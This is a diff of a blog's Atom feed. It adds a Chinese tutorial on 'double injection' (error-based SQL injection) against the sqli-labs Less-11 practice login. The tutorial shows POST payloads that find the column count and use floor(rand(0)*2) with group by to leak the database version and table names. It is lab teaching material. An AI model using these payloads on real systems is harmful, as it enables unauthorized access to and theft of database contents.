@@ -3,12 +3,92 @@
     <id>https://kiyomijin.github.io</id>
     <title>My Violet Eva Garden • Posts by &#34;sql注入探究&#34; tag</title>
     <link href="https://kiyomijin.github.io" />
-    <updated>2022-09-29T15:57:38.000Z</updated>
+    <updated>2022-09-30T16:08:18.000Z</updated>
     <category term="原创" />
-    <category term="数据库安全" />
     <category term="SQL注入探究" />
+    <category term="数据库安全" />
     <category term="CTF小训" />
     <category term="Misc" />
+    <entry>
+        <id>https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/</id>
+        <title>双注入</title>
+        <link rel="alternate" href="https://kiyomijin.github.io/2022/10/01/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E5%8F%8C%E6%B3%A8%E5%85%A5/"/>
+        <content type="html">&lt;h1 id=&#34;sql-注入之双注入&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#sql-注入之双注入&#34;&gt;#&lt;/a&gt; SQL 注入之双注入&lt;/h1&gt;
+&lt;p&gt;本篇使用双注入。&lt;/p&gt;
+&lt;h2 id=&#34;注入步骤&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#注入步骤&#34;&gt;#&lt;/a&gt; 注入步骤&lt;/h2&gt;
+&lt;h3 id=&#34;设置代理&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#设置代理&#34;&gt;#&lt;/a&gt; 设置代理&lt;/h3&gt;
+&lt;p&gt;还是 Less-11，我们挂上&lt;strong&gt; BurpSuit&lt;/strong&gt; 代理，然后&lt;strong&gt; Send To Reapeater&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930220638714.png&#34; alt=&#34;image-20220930220638714&#34;&gt;&lt;/p&gt;
+&lt;h3 id=&#34;确定注入类型和列数&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确定注入类型和列数&#34;&gt;#&lt;/a&gt; 确定注入类型和列数&lt;/h3&gt;
+&lt;p&gt;我们输入 1 + 单引号。 &lt;strong&gt;不报错&lt;/strong&gt;&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930221056886.png&#34; alt=&#34;image-20220930221056886&#34;&gt;&lt;/p&gt;
+&lt;p&gt;输入 1 + 单引号 + %23&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27;&amp;quot; %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;报错， &lt;code&gt;&amp;quot; #&#39; and password=&#39;123456&#39; LIMIT 0,1&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;由 #号后面跟着个单引号，这就说明第一个&lt;strong&gt; username 是使用单引号闭合的&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930221013645.png&#34; alt=&#34;image-20220930221013645&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 order by n 确定列数&lt;/p&gt;
+&lt;p&gt;输入 2，不报错&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 2 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930221434509.png&#34; alt=&#34;image-20220930221434509&#34;&gt;&lt;/p&gt;
+&lt;p&gt;输入 3，报错&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; order by 3 %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930221557671.png&#34; alt=&#34;image-20220930221557671&#34;&gt;&lt;/p&gt;
+&lt;p&gt;综上，注入类型是&lt;strong&gt; POST 型单引号注入&lt;/strong&gt;，且&lt;strong&gt;查询列数为 2&lt;/strong&gt;。&lt;/p&gt;
+&lt;p&gt;采用双注入时，我们需要使用到以下函数：&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;group by 函数：在对数据进行分组时会先看虚拟表中是否存在这个值，不存在就插入；&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor()函数：MySQL的一个数学函数。此函数用于查找等于或小于给定数字的最大整数。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;Select floor(11.2); ----&amp;gt;返回11（注意，只返回11，因为11是小于11.2的最大整数）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|   floor(11.2)  |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;|           11   |&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;+----------------+&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;rand()函数：获取随机的浮点数（小于0的小数），而 rand(0) 则是获取固定的小数值&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;举例说明：select rand() from qs_ad_category;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;结果为随机的浮点型小数：0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;floor() 函数 配合 rand() 函数&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;由于rand()函数是获取小于1 的浮点数，也就是例如上述结果中的0.7450851357961866&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;而floor()函数是将括号中的值取整，以小于括号中值的最大整数作为结果展示出来。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;例如上述rand()的结果为 0.7450851357961866，那么最大整数就是 “0” 所以 ：&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select floor(rand(0)) from qs_ad_category 的 结果值 为 “0” 。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;若是rand()*2,则 rand() 结果可能会大于 1 ，那么结合 floor()函数 ——最终的值可能为0，可能为1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count() 函数：计数函数，用来计算数据总和的函数，该函数结果集只有一个。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(1)：统计不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(*)：统计所有的记录（包括NULL）&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(字段)：统计该&amp;quot;字段&amp;quot;不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;count(DISTINCT 字段)：统计该&amp;quot;字段&amp;quot;去重且不为NULL 的记录。&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;如果三者一起使用:&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;select 1,count(1) from information_schema.tables group by floor(rand(0)*2)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;意思是，floor(rand(0)*2)这个值存在的话 count()加1，若虛表不存在记录，插入虚表时会把floor(rand(0)*2)再执行一次（注意是一次，很重要！！！）&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;使用 group by floor (rand () *2)&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,2 from information_schema.tables group by floor(rand()*2) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930223216903.png&#34; alt=&#34;image-20220930223216903&#34;&gt;&lt;/p&gt;
+&lt;p&gt;可以看到，uname 和 password 位都被 select 的内容（1 和 2）代替。&lt;/p&gt;
+&lt;p&gt;下面探究 group by、rand ()、count () 的组合使用的关系。&lt;/p&gt;
+&lt;h3 id=&#34;灵魂拷问一rand和rand0有什么区别&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#灵魂拷问一rand和rand0有什么区别&#34;&gt;#&lt;/a&gt; 灵魂拷问一：rand () 和 rand (0) 有什么区别？&lt;/h3&gt;
+&lt;p&gt;使用 &lt;code&gt;rand() *2&lt;/code&gt; ， &lt;code&gt;第一次&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930225234750.png&#34; alt=&#34;image-20220930225234750&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;rand() *2&lt;/code&gt; ， &lt;code&gt;第二次&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930225215910.png&#34; alt=&#34;image-20220930225215910&#34;&gt;&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;rand() *2&lt;/code&gt; ， &lt;code&gt;第三次&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930225250214.png&#34; alt=&#34;image-20220930225250214&#34;&gt;&lt;/p&gt;
+&lt;p&gt;综合以上三次使用 rand ()*2 的情况，我们发现结果毫无规律，是真正的随机。&lt;/p&gt;
+&lt;p&gt;使用 &lt;code&gt;rand(0) *2&lt;/code&gt; ， &lt;code&gt;第一次&lt;/code&gt; 、 &lt;code&gt;第二次&lt;/code&gt; 、 &lt;code&gt;第三次&lt;/code&gt; 都是下图：&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930225429894.png&#34; alt=&#34;image-20220930225429894&#34;&gt;&lt;/p&gt;
+&lt;p&gt;结果说明，使用 rand (0)*2 可以做到一种伪随机变化，会一直保持 011 011 011 这样的规律。&lt;/p&gt;
+&lt;h3 id=&#34;灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#灵魂拷问二为什么select-1-count1-from-xxx-group-by-floorrand0-2-会报错&#34;&gt;#&lt;/a&gt; 灵魂拷问二：为什么 select 1, count (1) from xxx group by floor (rand (0) * 2) 会报错？&lt;/h3&gt;
+&lt;p&gt;我们需要知道先创建虚拟表，以下图 (其中 key 是 group by 后面跟随的内容【即主键】，不可重复)&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930230206868.png&#34; alt=&#34;image-20220930230206868&#34;&gt;&lt;/p&gt;
+&lt;p&gt;开始查询数据，取数据库数据，而后查看虚拟表中是否存在主键，不存在则插入新记录，存在则 count (1) 字段直接加 1，&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930230334615.png&#34; alt=&#34;image-20220930230334615&#34;&gt;&lt;/p&gt;
+&lt;p&gt;由此看到 若是 key 存在的话就 + 1， 不存在的话就新建一个 key。&lt;/p&gt;
+&lt;p&gt;但是 mysql 官方有给提示，查询的时候若是使用了 rand () 的话，该值会被计算屡次，这个【计算屡次】是什么意思？就是在使用 group by 的时候，floor (rand (0)*2) 会被执行一次，若是虚表不存在这个记录，插入虚表的时候会再被执行一次。&lt;/p&gt;
+&lt;p&gt;由前文可知，floor (rand (0)*2) 的值是 011011011… 的规律。&lt;/p&gt;
+&lt;p&gt;取第一条记录，取到的值是 0【 &lt;code&gt;第一次计算&lt;/code&gt; 】。&lt;/p&gt;
+&lt;p&gt;&lt;code&gt;判断&lt;/code&gt; ：虚表中发现 0 这个键值并不存在，那么，floor (rand (0)*2) 会被再次计算一次&lt;/p&gt;
+&lt;p&gt;结果取到了 1【 &lt;code&gt;第二次计算&lt;/code&gt; 】。将 key=1 插入虚表，这是第一条记录查询完毕。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930231052670.png&#34; alt=&#34;image-20220930231052670&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查询第二次记录，再次计算 floor (rand (0)*2)，发现结果为 1【 &lt;code&gt;第三次计算&lt;/code&gt; 】。&lt;/p&gt;
+&lt;p&gt;查询虚表，发现 1 这个键值已经存在，因此 floor (rand (0)*2) 不会再次计算，直接 count (1) 加 1，第二条记录查询完毕。&lt;/p&gt;
+&lt;p&gt;&lt;img src=&#34;image-20220930231458853.png&#34; alt=&#34;image-20220930231458853&#34;&gt;&lt;/p&gt;
+&lt;p&gt;查询第三条记录，再次计算 floor (rand (0)*2)，取值为 0【 &lt;code&gt;第四次计算&lt;/code&gt; 】，查询虚表，发现键值没有 0，则再次计算 floor，取值为 1【 &lt;code&gt;第五次计算&lt;/code&gt; 】&lt;/p&gt;
+&lt;p&gt;而此时，1 这个主键已经存在于虚表中，新计算的值也为 1【 &lt;code&gt;第五次计算&lt;/code&gt; 】，&lt;strong&gt;由于插入的 key 主键值必须唯一&lt;/strong&gt;，新计算的 1 和主键 1 重复，因此插入的时候直接报错。&lt;/p&gt;
+&lt;h3 id=&#34;灵魂拷问三选择rand0而非rand的原因&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#灵魂拷问三选择rand0而非rand的原因&#34;&gt;#&lt;/a&gt; 灵魂拷问三：选择 rand (0) 而非 rand () 的原因&lt;/h3&gt;
+&lt;p&gt;简而言之，group by 插入进 &amp;lt;key，count (1)&amp;gt; 虚表的前提是 —— &lt;code&gt;当前的记录在虚表中不存在&lt;/code&gt; 。&lt;/p&gt;
+&lt;p&gt;白话文解释：当前的记录由于 011011011 这特殊规律导致 0 这个记录的在表中不存在，计算时总是被取值成 1 插入虚表，第一次还能插进来，但在第二次新插入进来的 1 又存在于虚表中，所以就报 “重复条目 “的错了。&lt;/p&gt;
+&lt;p&gt;选择 &lt;code&gt;rand(0)x2&lt;/code&gt;  是&lt;strong&gt;必会报错&lt;/strong&gt;，而 &lt;code&gt;rand()x2&lt;/code&gt;  就不一定了【可能报错、可能不报错】。&lt;/p&gt;
+&lt;p&gt;因为通过上文解释，如果不是 011011 这个特殊规律，0 和 1 是都可以进到虚表中，如果都能进来，那就不会报错。&lt;/p&gt;
+&lt;p&gt;因此，100% 报错须要 count ()，rand (0)*2、group by，三者缺一不可。&lt;/p&gt;
+&lt;h3 id=&#34;双注入走起&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#双注入走起&#34;&gt;#&lt;/a&gt; 双注入走起&lt;/h3&gt;
+&lt;p&gt;首先使用 concat 组合字符串&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), version()) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001000024436.png&#34; alt=&#34;image-20221001000024436&#34;&gt;&lt;/p&gt;
+&lt;p&gt;将 version 处替换成我们想要的 select 语句【注意，这里只能使用 limit 0,1 来进行输出爆破，group_concat 会爆出数据库信息失败】&lt;/p&gt;
+&lt;figure class=&#34;highlight plaintext&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;uname=1&amp;#x27; union select 1,count(1) from information_schema.tables group by concat(floor(rand(0)*2), (select table_name from information_schema.tables where table_schema=database() limit 0,1)) %23&amp;amp;passwd=123456&amp;amp;submit=Submit&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
+&lt;p&gt;&lt;img src=&#34;image-20221001000515293.png&#34; alt=&#34;image-20221001000515293&#34;&gt;&lt;/p&gt;
+&lt;p&gt;至此，双注入演示完毕。&lt;/p&gt;
+</content>
+        <category term="SQL注入探究" />
+        <updated>2022-09-30T16:08:18.000Z</updated>
+    </entry>
     <entry>
         <id>https://kiyomijin.github.io/2022/09/29/SQL%E6%B3%A8%E5%85%A5%E6%8E%A2%E7%A9%B6/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/</id>
         <title>报错注入</title>
